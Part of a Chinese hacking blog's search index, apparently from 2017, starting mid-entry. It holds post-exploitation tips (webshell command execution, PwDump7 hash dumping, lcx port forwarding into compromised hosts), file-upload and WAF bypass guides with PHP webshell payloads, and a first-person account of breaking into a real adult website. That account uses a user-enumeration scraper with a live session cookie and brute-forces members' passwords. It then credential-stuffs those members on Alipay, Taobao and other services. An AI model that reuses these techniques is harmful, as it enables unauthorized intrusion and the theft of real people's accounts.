admin<br>17.有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:\xxx\exp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。<br>18.一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现<br>19.执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt /c c:\windows\temp\cookies\PwDump7.exe &gt;1.txt<br>20.菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:\windows\temp\cmd.exe 设置终端路径为：c:\windows\temp\cmd.exe<br>21.当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。 上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令/c “c:\windows\temp\cookies\cscript.exe” d:\web\iispwd.vbs<br>22.如何辨别服务器是不是内网？ 192.168.x.x 172.16.x.x 10.x.x.x</p>
<hr>
<h2 id="lcx使用手册"><a href="#lcx使用手册" class="headerlink" title="lcx使用手册"></a>lcx使用手册</h2><p> lcx.exe是个端口转发工具,相当于把肉鸡A上的3389端口转发到B机上,当然这个B机必须有外网IP.这样链接B机的3389度端口就相当于链接A机的3389. </p>
<p> 下面就先详细讲解下LXC转发工具与使用方法：<br>如在本机B上监听 -listen 51 3389，在肉鸡A上运行-slave<br>本机ip 51 肉鸡ip 3389 那么在本地连127.0.0.1就可以连肉鸡的3389.第二条是本机转向。<br>例:现在有一个ip为222.221.221.22的websehll.用端口扫描发现开放了3389端口<br>可是我们输入外网IP可是不能正常链接。那么很有可能就是内网服务器。我们cmd（terminal）执行ipconfig（ifconfig）可以看出是否是内网服务器<br>上传lcx.exe到肉鸡 然后 cx.exe -listen 51 3389 意思是监听51端口并转发到3389端口。<br>显示如下[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br> 然后在肉鸡上运行 lcx.exe -slave 你的IP 51 222.221.221.22 3389<br>222.221.221.22是我举例用的肉鸡IP.换成你的..运行以后本机监听端口。</p>
<p>显示如下信息</p>
<p>[+] Listening port 51 ……<br>[+] Listen OK!<br>[+] Listening port 3389 ……<br>[+] Listen OK!<br>[+] Waiting for Client on port:51 ……<br>[+] Accept a Client on port 55 from 222.221.221.22 ……<br>[+] Waiting another Client on port:3389….</p>
<p>好了.现在在自己机子上链接 127.0.0.1 或者输你自己IP.<br>发现进去的不是自己机子,(或者自己机子根本连不上),而是肉鸡A了!优点,搞定内网肉鸡.<br>缺点,有点麻烦,而且每次都要通过sqltools先进行端口转发.当然也可以用反弹木马控制肉鸡</p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传的那些事（下）]]></title>
      <url>http://www.warmeng.com/2017/04/12/the_upload(l)/</url>
      <content type="html"><![CDATA[<p>绕过！<br><a href="http://thief.one/" target="_blank" rel="external">nmask</a></p>
<a id="more"></a>
<h1 id="各种文件上传绕过姿势"><a href="#各种文件上传绕过姿势" class="headerlink" title="各种文件上传绕过姿势"></a>各种文件上传绕过姿势</h1><h2 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h2><p>可以利用bp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
<h2 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h2><h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>通过bp抓包，将content-type字段改为image/gif</p>
<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息，有点像下面的结构<br>GIF89a&lt;?php phpinfo(); ?&gt;</p>
<h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。<br>绕过方法：<br>（1）找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类<br>（2）可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类<br>能被解析的文件扩展名列表：<br>jsp jspx jspf<br>asp asa cer aspx<br>php php php3 php4<br>exe exee</p>
<h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。<br>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）<br>（1）先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；<br>（2）然后再上传一个.php的文件，内容为&lt;?php Include(“上传的txt文件路径”);?&gt;<br>此时，这个php文件就会去引用txt文件的内容，从而绕过校验</p>
<h2 id="配合解析漏洞"><a href="#配合解析漏洞" class="headerlink" title="配合解析漏洞"></a>配合解析漏洞</h2><p>详情请看文件上传（上）</p>
<h2 id="配合操作系统文件命名规则"><a href="#配合操作系统文件命名规则" class="headerlink" title="配合操作系统文件命名规则"></a>配合操作系统文件命名规则</h2><p>（1）上传不符合windows文件命名规则的文件名<br>　　test.asp.<br>　　test.asp(空格)<br>　　test.php:1.jpg<br>　　test.php::$DATA<br>　　shell.php::$DATA…….<br>会被windows系统自动去掉不符合规则符号后面的内容。<br>（2）linux下后缀名大小写<br>在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
<h2 id="配合其他规则"><a href="#配合其他规则" class="headerlink" title="配合其他规则"></a>配合其他规则</h2><p>   0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候<br>　　test.php(0x00).jpg<br>　　test.php%00.jpg<br>　　路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</p>
<hr>
<h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h2><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<br><img src="/images/upload/1.png" alt=""><br>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。<br><img src="/images/upload/2.png" alt=""><br>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h2 id="filename"><a href="#filename" class="headerlink" title="filename"></a>filename</h2><p>针对早期版本安全狗，可以多加一个filename<br><img src="/images/upload/3.png" alt=""><br>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：<br><img src="/images/upload/4.png" alt=""></p>
<h2 id="post-get"><a href="#post-get" class="headerlink" title="post/get"></a>post/get</h2><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。<br>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h2 id="利用waf本身"><a href="#利用waf本身" class="headerlink" title="利用waf本身"></a>利用waf本身</h2><p>删除实体里面的Conten-Type字段<br><img src="/images/upload/5.png" alt=""><br>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。<br>删除Content-Disposition字段里的空格<br><img src="/images/upload/6.png" alt=""><br>增加一个空格导致安全狗被绕过案列：<br>Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099<br>尝试在boundary后面加个空格或者其他可被正常处理的字符：<br>boundary= —————————47146314211411730218525550<br>修改Content-Disposition字段值的大小写<br><img src="/images/upload/7.png" alt=""><br>文件名处回车<br><img src="/images/upload/8.png" alt=""></p>
<h2 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h2><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><img src="/images/upload/9.png" alt=""></p>
<hr>
<p>文章出处：<br><a href="http://thief.one/" target="_blank" rel="external">文件上传漏洞(绕过姿势)| nMask’Blog</a><br><a href="https://xianzhi.aliyun.com/forum/read/458.html?fpage=2" target="_blank" rel="external">tools大牛</a></p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gitshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件上传的那些事（上）]]></title>
      <url>http://www.warmeng.com/2017/04/09/the_upload(f)/</url>
      <content type="html"><![CDATA[<p>文件上传的那些故事，不想在到网上搜着看了，是时候来汇总收集一波了，大部分内容由nmask大神博客转载！<br><a href="http://thief.one/" target="_blank" rel="external">nmask</a></p>
<a id="more"></a>
<hr>
<h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><p>文件上传是web应用中经常出现的功能，他允许用户上传文件到服务器并保存到特定的位置。这对安全来说是一个很敏感的问题，一旦恶意的应用程序被上传到服务器并获取到执行权限，后果将不堪设想。</p>
<hr>
<h2 id="文件上传先从解析漏洞开始"><a href="#文件上传先从解析漏洞开始" class="headerlink" title="文件上传先从解析漏洞开始"></a>文件上传先从解析漏洞开始</h2><h3 id="IIS5-X-IIS6-X"><a href="#IIS5-X-IIS6-X" class="headerlink" title="IIS5.X-IIS6.X"></a>IIS5.X-IIS6.X</h3><p>大多数用该容器的网站系统都是windows2003，用的脚本多为asp，一旦木马上传成功拥有较大的权限，该解析漏洞也只能asp文件，而不能解析aspx文件。<br>   目录解析：<br>  /xx.asp/xx.jpg<br>在网站下建立文件夹的名字为.asp,.asa,.cer的文件夹,该目录的任何扩展名的文件都被IIS当做asp文件来解析并且执行<br>   文件解析:<br>  xx.asp;.jgp<br>在IIS6.0下，分号后面的不被解析，也就是说在IIS6.0默认的可执行的文件中还包含xx.asa,xx.cer,xx.cdx这三种</p>
<h3 id="iis-7-0-iis7-5-Nginx-lt-8-03畸形解析漏洞"><a href="#iis-7-0-iis7-5-Nginx-lt-8-03畸形解析漏洞" class="headerlink" title="iis 7.0/iis7.5/Nginx &lt;8.03畸形解析漏洞"></a>iis 7.0/iis7.5/Nginx &lt;8.03畸形解析漏洞</h3><p>在默认Fast-CGI开启的状况下，黑阔上传一个名字为wooyun.jpg，内容为&lt;?php fputs(‘shell.php’,’w’),’&lt;?php eval($_post[cmd]?)&gt;’);?&gt;的文件，然后访问wooyun.jpg/.php,在这个目录下就会生成一句话木马</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>0.5，0.6,0.7&lt;=0.7.65&amp;&amp;08&lt;=0.8.37<br>Nginx在图片中嵌入PHP代码然后通过访问XXX.JPG%00.PHP来执行其中的代码<br>0.5.<em>&amp;&amp;0.6.</em>&amp;&amp;0.7&lt;=0.7.65&amp;&amp;0.8&lt;=0.8.37<br>在以上NGINX容器的版本下，上传一个在WAF白名单之内扩展名的文件shell.jpg,然后用shell.jpg.php警醒请求<br>0.8.041-1.5.6<br>在以上的NGINX容器的版本下，上传一个waf白名单之内扩展名的文件shell.jpg，然后用shell.jpg%20.php进行请求</p>
<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>Apache是从右到左开始判断解析，如果为不可识别解析，就在往左边判断.比如说wooyun.php.owf.rar，后面两种后缀是apache不可识别解析的，apache就会把该文件解析成php，所以如何判断是不是合法的后缀就是这个漏洞的利用关键，测试时可以尝试上传一个wooyun.php.rara.xxx…..（反正就是随意填）去测试是否是合法的后缀</p>
<p>##其他<br>如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>  如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<hr>
<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><h3 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h3><p>普通本地包含<br>&lt;?php include_once(&amp;_GET[‘f’]); ?&gt;</p>
<p> Php?f=1.txt</p>
<p>截断本地包含<br>Magic_quote_gpc为off的情况使用<br>Php?=1.txt%00</p>
<p>长文件名截断</p>
<p>&lt;?php  include_once($_GET[‘f’].”.php”); ?&gt;<br>Php?f=1.txt/././././././././././././././././././…………php</p>
<h3 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h3><p>这种默认情况下关闭的套路别用了，愁人！还有些什么session文件包含一句话什么的看不懂，暂时不研究。</p>
]]></content>
      
        <categories>
            
            <category> 攻略 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gitshell </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[通過黃色網站對用戶的社工]]></title>
      <url>http://www.warmeng.com/2017/04/05/hweb/</url>
      <content type="html"><![CDATA[<p>一次和龍灣大佬合作的的實戰記錄，這次的實戰過程給我一個警醒。</p>
<p> 不管你的密碼是否複雜，永遠不要在所有的網站上使用同一個密碼。不然真的真的真的很危險。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;–by warmeng and orleven</p>
<a id="more"></a>
<h1 id="引子"><a href="#引子" class="headerlink" title="引子"></a>引子</h1><p>該黃色網站由某位廣告老司機發佈在群中，（由於博主還是一個純真的少年，這裡就不開車發網址了~）登陸該網址發現必須要買會員才能看裡面的資源，加入會員需要50塊錢的入會費，呵呵噠，我等屌絲窮逼什麼時候能承受這麼一筆天價巨款！！日站！！</p>
<h2 id="信息收集與準備工作"><a href="#信息收集與準備工作" class="headerlink" title="信息收集與準備工作"></a>信息收集與準備工作</h2><p>cms版本：dizcus<br>腳本：php<br>系統：windows<br>容器：Nginx<br>各種滲透工具：burpsuite，awvs，nmap，dirsearch，御劍，龍灣大佬自製腳本（小型爬蟲）<br>註冊會員名單若干。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">$ </div><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line">import threading</div><div class="line">import requests</div><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">threads = []</div><div class="line">request = requests.session()</div><div class="line">header = &#123;&#125;</div><div class="line">header[<span class="string">"User-Agent"</span>] = <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"</span></div><div class="line">header[<span class="string">"Content-Type"</span>] = <span class="string">"application/x-www-form-urlencoded"</span></div><div class="line">header[<span class="string">"Accept"</span>] = <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span></div><div class="line">header[<span class="string">"Accept-Language"</span>] = <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span></div><div class="line">header[<span class="string">"Accept-Encoding"</span>] = <span class="string">"gzip, deflate"</span></div><div class="line">header[<span class="string">"Cookie"</span>] = <span class="string">"UM_distinctid=15b376519ba53e-007c3d87be62c08-1262694a-144000-15b376519bb462; CNZZDATA1261494228=831009649-1491280862-%7C1491291663; Ytbs_2132_saltkey=HHsNZ9Hr; Ytbs_2132_lastvisit=1491285722; Ytbs_2132_sid=BICooo; Ytbs_2132_lastact=1491293284%09misc.php%09patch; Ytbs_2132_home_diymode=1; Ytbs_2132_sendmail=1; Ytbs_2132_ulastactivity=816dDp017aWFAasznplKs9EHKYb9Od2auDpLW0iBm%2FTWqLOzFZVV; Ytbs_2132_auth=459esi4d2DZpue0D6iCJsczCsnO4LrzJk6UAT4CEFtTS4hentR2om0QocI2q1ojqlszIzumjgzg1TBrNrpYJWXSl%2FQ; Ytbs_2132_lastcheckfeed=46107%7C1491293279; Ytbs_2132_checkfollow=1; Ytbs_2132_lip=183.157.172.91%2C1491284503; Ytbs_2132_checkpm=1; Ytbs_2132_noticeTitle=1; tjpctrl=1491295070306"</span></div><div class="line">indexUrl = <span class="string">"http://www.lolibus.com/?"</span></div><div class="line"></div><div class="line"></div><div class="line">def index(num,indexUrl):</div><div class="line">    <span class="keyword">for</span> userid <span class="keyword">in</span> xrange(num * 5000, ( num +1) * 5000 ):</div><div class="line">        try:</div><div class="line">            targetUrl = indexUrl + str(userid)</div><div class="line">            results = request.get(targetUrl,headers=header)</div><div class="line">            <span class="comment"># print results.content</span></div><div class="line">            <span class="keyword">if</span> <span class="string">"待推广会"</span> not <span class="keyword">in</span>  results.content:</div><div class="line">                username = str(BeautifulSoup(results.content).title)</div><div class="line">                username = username[7:username.find(<span class="string">"的个人资料"</span>)]</div><div class="line">                <span class="built_in">print</span> username</div><div class="line">        except:</div><div class="line">            <span class="comment"># print "[-] Not Available !"</span></div><div class="line">            pass</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> xrange(0,10):</div><div class="line">        t =  threading.Thread(target=index,args=(num,indexUrl,))</div><div class="line">        t.start()</div><div class="line">        threads.append(t)</div></pre></td></tr></table></figure></p>
<h2 id="滲透思路與過程"><a href="#滲透思路與過程" class="headerlink" title="滲透思路與過程"></a>滲透思路與過程</h2><p>找對應cms公開的漏洞———-失敗！完全不會這個，從來沒有成功過關<br>掃描端口以及對應後台———-成功！掃出一個wdcp登陸的後台<br>爆破管理與賬號密碼———–失敗，并被鎖定ip！<br>註冊用戶———-失敗，交50塊錢的入會費，交不起！<br>爆破正式會員的弱口令———-成功！各種小電影隨便看！<br>越權漏洞———–成功！觀看任意用戶的用戶名！<br>通過正式會員修改頭像方式文件上傳————失敗！網頁白名單限制，沒有解析漏洞，也沒有通過截斷上傳！<br>通過正式會員修改個人資料及發送消息進行XSS攻擊———–失敗！XSS並不是很熟練，但是也看出該網站對XSS進行了過濾！<br>滲透方面，并咩有找到什麼能getshell的辦法，很氣，怎麼辦，我也很絕望！</p>
<hr>
<p>滲透沒有什麼突破，但是獲得了一個很重要的信息，我們能通過越權看到任意用戶的用戶名  xxxx?id=x  的url形式，我們只需要通過修改x的值就能得到任意用戶的用戶名，得到用戶名，進行批量的爆破，由此可證，量變引起質變。用龍灣大佬自製的腳本對正式會員用戶進行爬取<br><img src="/images/20170405/1.png" alt=""></p>
<hr>
<p>發現到用戶登錄的地方沒有驗證碼的限制，但是有登錄錯誤次數的限制<br><img src="/images/20170405/2.png" alt=""></p>
<hr>
<p>發現該網站用戶登錄的登錄限制是通過ip和用戶名一起的,即同一個用戶和同一個IP地址只能輸入5次,但是IP的限制我們可以通過修改X-Forwarded-For的方式繞過,用戶名就沒有辦法羅！<br><img src="/images/20170405/3.png" alt=""></p>
<hr>
<p>思考階段，我們隊爬取出來的用戶表進行了分析，如果用戶名是英文的尤其是那種幾個字母加上數字及其有可能用戶名==密碼。由此爆破出很多正式用後的賬號密碼，盜號成功！登錄！<br>人人網，12306，網易郵箱，支付寶，淘寶，京東，智聯，趕集全部撞庫成功！由於支付寶，淘寶等需要手機驗證，不會繞過，就此作罷。<br><img src="/images/20170405/10.png" alt=""><br><img src="/images/20170405/11.png" alt=""></p>
<hr>
<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>博主還只是小菜狗一隻，需要更強大的技術來getshell，來入侵，希望得到更多大佬的指點與解惑。通過這次也警醒了大家要慎重的考慮自己的密碼。</p>
]]></content>
      
        <categories>
            
            <category> 实战过程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 实战 </tag>
            
            <tag> 社工 </tag>
            
        </tags>
        
    </entry>
    
  
  
</search>
